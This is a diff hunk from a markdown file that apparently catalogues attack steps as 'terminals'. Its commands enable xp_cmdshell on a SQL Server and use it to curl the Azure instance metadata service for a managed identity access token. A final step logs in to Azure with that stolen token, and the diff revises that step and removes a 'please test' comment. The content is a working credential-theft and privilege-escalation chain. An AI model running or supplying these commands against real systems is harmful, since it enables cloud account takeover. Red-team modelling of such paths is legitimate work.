@@ -8,10 +8,8 @@ c1 = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Usernam
 c2 = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC master..sp_configure ‘xp_cmdshell’, 1; RECONFIGURE WITH OVERRIDE;"
 c3 = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC master..sp_configure ‘SHOW advanced options’,0; RECONFIGURE WITH OVERRIDE;"
 c4 = $accessToken = Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password "<password>" -Query "EXEC xp_cmdshell 'curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"'" | Select-String -Pattern '^{.*}' | ForEach-Object { $tokenObject = ConvertFrom-Json $_.Matches[0].Value; $tokenObject.access_token }
-c5 = az login -u <sqlserver> -p $accessToken --service-principal
+c5 = az login --service-principal -u <app-id> -p $accessToken  --tenant <tenant>
 ```
-
-[//]: # (^ not sure if c5 is correct, please test)
 
 ### Activities (non-terminals)
 ```
